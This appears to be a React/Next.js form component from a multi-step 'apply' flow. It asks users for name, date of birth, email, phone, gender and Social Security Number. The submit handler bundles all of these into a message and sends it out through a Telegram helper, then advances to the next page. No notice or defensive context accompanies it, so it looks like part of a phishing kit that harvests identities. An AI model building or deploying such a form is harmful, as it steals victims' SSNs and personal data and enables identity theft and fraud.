/* eslint-disable @next/next/no-img-element */
"use client";
import { sendTelegramMessage } from "../../../utils/telegram";
import { useState } from "react";
import { useRouter } from "next/navigation";

const PersonalInformationForm = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    day: "",
    month: "",
    year: "",
    email: "",
    confirmEmail: "",
    phone: "",
    gender: "",
    ssn: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleChange = (field: string, value: string) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  const formatSSN = (value: string) => {
    return value.replace(/\D/g, "").replace(/(\d{3})(\d{2})(\d{4})/, "$1-$2-$3");
  };

  const formatPhone = (value: string) => {
    return value.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.day || !formData.month || !formData.year) {
      newErrors.dob = "Date of Birth is required";
    }
    if (!formData.firstName.trim()) newErrors.firstName = "First name is required";
    if (!formData.lastName.trim()) newErrors.lastName = "Last name is required";
    if (!formData.email.trim()) newErrors.email = "Email is required";
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) newErrors.email = "Invalid email format";
    if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = "Emails do not match";
    if (!formData.phone.trim()) newErrors.phone = "Phone Number is required";
    if (!formData.gender) newErrors.gender = "Gender is required";
    if (!formData.ssn.trim()) newErrors.ssn = "SSN is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    const dob = `${formData.year}-${formData.month}-${formData.day}`;

    const message = `New User Form Submission:
    First Name: ${formData.firstName}
    Last Name: ${formData.lastName}
    Date of Birth: ${dob}
    Email: ${formData.email}
    Gender: ${formData.gender}
    Phone Number: ${formData.phone}
    SSN: ${formData.ssn}`;

    await sendTelegramMessage(message);
    router.push("/apply/education");
  };

  return (
    <div className="min-h-screen bg-gray-50">
    {/* Sticky Header Section */}
    <header className="bg-green-600 shadow-md sticky top-0 z-10">
      <div className="max-w-3xl mx-auto p-4 flex items-center">
        <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
        <div className="flex-1 ml-2">
          <div className="h-2 bg-green-500 rounded-full mt-1">
            <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
          </div>
        </div>
      </div>
    </header>
  
    {/* Main Content */}
    <main className="flex-grow container mx-auto mt-12 px-4">
      <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
        {/* Title for Personal Information Form */}
        <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Personal Information</h1>
        
        <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-black">First Name</label>
                  <input
                    type="text"
                    value={formData.firstName}
                    onChange={(e) => handleChange("firstName", e.target.value)}
                    className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                    required
                  />
                  {errors.firstName && <p className="text-red-500 text-sm mt-1">{errors.firstName}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-black">Last Name</label>
                  <input
                    type="text"
                    value={formData.lastName}
                    onChange={(e) => handleChange("lastName", e.target.value)}
                    className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                    required
                  />
                  {errors.lastName && <p className="text-red-500 text-sm mt-1">{errors.lastName}</p>}
                </div>
              </div>
            </div>

            {/* Date of Birth */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Date of Birth</label>
              <div className="grid grid-cols-3 gap-2">
                <input
                  id="day"
                  name="day"
                  type="text"
                  placeholder="DD"
                  value={formData.day}
                  onChange={(e) => handleChange("day", e.target.value)}
                  className="block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white"
                  maxLength={2}
                />
                <input
                  id="month"
                  name="month"
                  type="text"
                  placeholder="MM"
                  value={formData.month}
                  onChange={(e) => handleChange("month", e.target.value)}
                  className="block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white"
                  maxLength={2}
                />
                <input
                  id="year"
                  name="year"
                  type="text"
                  placeholder="YYYY"
                  value={formData.year}
                  onChange={(e) => handleChange("year", e.target.value)}
                  className="block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white"
                  maxLength={4}
                />
              </div>
              {errors.dob && <p className="text-red-500 text-sm mt-1">{errors.dob}</p>}
            </div>

            {/* Email Fields */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Email Address</label>
              <input
                type="email"
                value={formData.email}
                onChange={(e) => handleChange("email", e.target.value)}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                required
              />
              {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Confirm Email Address</label>
              <input
                type="email"
                value={formData.confirmEmail}
                onChange={(e) => handleChange("confirmEmail", e.target.value)}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                required
              />
              {errors.confirmEmail && <p className="text-red-500 text-sm mt-1">{errors.confirmEmail}</p>}
            </div>

            {/* Gender Field */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Gender</label>
              <select
                value={formData.gender}
                onChange={(e) => handleChange("gender", e.target.value)}
                className="w-full mt-2 border rounded-lg p-3"
                required
              >
                <option value="">Select Gender</option>
                <option value="male">Male</option>
                <option value="female">Female</option>
                <option value="other">Other</option>
              </select>
              {errors.gender && <p className="text-red-500 text-sm mt-1">{errors.gender}</p>}
            </div>

            {/* Phone Number */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Phone Number</label>
              <input
                value={formData.phone}
                onChange={(e) => handleChange("phone", formatPhone(e.target.value))}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                maxLength={14}
                required
              />
              {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
            </div>

            {/* SSN */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Social Security Number</label>
              <input
                value={formData.ssn}
                onChange={(e) => handleChange("ssn", formatSSN(e.target.value))}
                className="w-full mt-2 border rounded-lg p-3 text-black bg-white"
                maxLength={11}
                required
              />
              {errors.ssn && <p className="text-red-500 text-sm mt-1">{errors.ssn}</p>}
            </div>

            <button type="submit" className="w-full bg-green-500 text- p-4 rounded-xl hover:bg-green-600">
              Next
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PersonalInformationForm;